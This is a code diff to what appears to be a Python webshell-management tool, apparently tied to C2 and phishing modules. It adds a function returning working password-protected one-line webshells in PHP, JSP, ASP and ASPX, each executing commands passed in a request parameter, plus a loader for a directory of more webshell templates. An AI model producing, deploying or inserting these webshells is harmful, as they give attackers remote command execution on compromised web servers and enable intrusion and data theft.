@@ -5,7 +5,9 @@
 """
 
 import json
+import os
 import ssl
+import threading
 import time
 import urllib.error
 import urllib.parse
@@ -191,6 +193,92 @@ def build_file_command(conn: dict, action: str, path: str, content: str = "", ta
             return "powershell -NoProfile -NonInteractive -Command \"" + script + "\""
         return "echo '" + b64 + "' | base64 -d > " + _quote_posix(path)
     return ""
+
+
+def shell_template(shell_type: str = "php") -> str:
+    """返回指定类型的一句话木马模板(与 exec_command 协议配套:pass=<password>&<cmd_param>=<command>)。
+
+    占位符 __PASS__ / __CMD__ 由前端用表单的密码/命令参数替换。
+    支持的 type:php / jsp / asp / aspx(与连接类型下拉一致)。
+    """
+    t = (shell_type or "php").strip().lower()
+    if t == "php":
+        return ("<?php\n"
+                "@session_start();\n"
+                "if (isset($_POST['pass']) && $_POST['pass'] === '__PASS__') {\n"
+                "    @system($_POST['__CMD__']);\n"
+                "}\n"
+                "?>\n")
+    if t == "jsp":
+        return ("<%\n"
+                "    String p = request.getParameter(\"pass\");\n"
+                "    if (p != null && p.equals(\"__PASS__\")) {\n"
+                "        try {\n"
+                "            Process pr = Runtime.getRuntime().exec(request.getParameter(\"__CMD__\"));\n"
+                "            java.io.InputStream in = pr.getInputStream();\n"
+                "            int a;\n"
+                "            while ((a = in.read()) != -1) { out.print((char) a); }\n"
+                "            pr.waitFor();\n"
+                "        } catch (Exception e) { out.print(e.toString()); }\n"
+                "    }\n"
+                "%>\n")
+    if t == "asp":
+        return ("<% if request(\"pass\")=\"__PASS__\" then\n"
+                "set s=createobject(\"wscript.shell\")\n"
+                "set o=s.exec(request(\"__CMD__\"))\n"
+                "response.write o.stdout.readall\n"
+                "end if %>\n")
+    if t == "aspx":
+        return ("<%@ Page Language=\"C#\" %>\n"
+                "<%\n"
+                "if (Request[\"pass\"] == \"__PASS__\") {\n"
+                "    try {\n"
+                "        System.Diagnostics.Process p = new System.Diagnostics.Process();\n"
+                "        p.StartInfo.FileName = \"cmd.exe\";\n"
+                "        p.StartInfo.Arguments = \"/c \" + Request[\"__CMD__\"];\n"
+                "        p.StartInfo.UseShellExecute = false;\n"
+                "        p.StartInfo.RedirectStandardOutput = true;\n"
+                "        p.Start();\n"
+                "        Response.Write(p.StandardOutput.ReadToEnd());\n"
+                "    } catch (Exception e) { Response.Write(e.ToString()); }\n"
+                "}\n"
+                "%>\n")
+    return shell_template("php")
+
+
+# ── 模板库(目录即模块:webshell_templates/*.php|jsp|aspx|asp,参考 c2/phishing 模块体系) ──
+
+_TEMPLATE_LOADER = None
+_TEMPLATE_LOCK = threading.Lock()
+
+
+def _get_tpl_loader():
+    global _TEMPLATE_LOADER
+    if _TEMPLATE_LOADER is None:
+        with _TEMPLATE_LOCK:
+            if _TEMPLATE_LOADER is None:
+                from .webshell_tpl import TemplateLoader
+                base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+                loader = TemplateLoader(os.path.join(base, "webshell_templates"))
+                loader.load()
+                _TEMPLATE_LOADER = loader
+    return _TEMPLATE_LOADER
+
+
+def list_templates() -> list:
+    """列出模板库模块: [{name, desc, category, params}]"""
+    try:
+        return _get_tpl_loader().list_templates()
+    except Exception:
+        return []
+
+
+def render_template(name: str, params: dict = None):
+    """渲染模板库模块({{param}} 替换);不存在返回 None。"""
+    try:
+        return _get_tpl_loader().render(name, params)
+    except Exception:
+        return None
 
 
 def exec_command(conn: dict, command: str, timeout: int = 30):
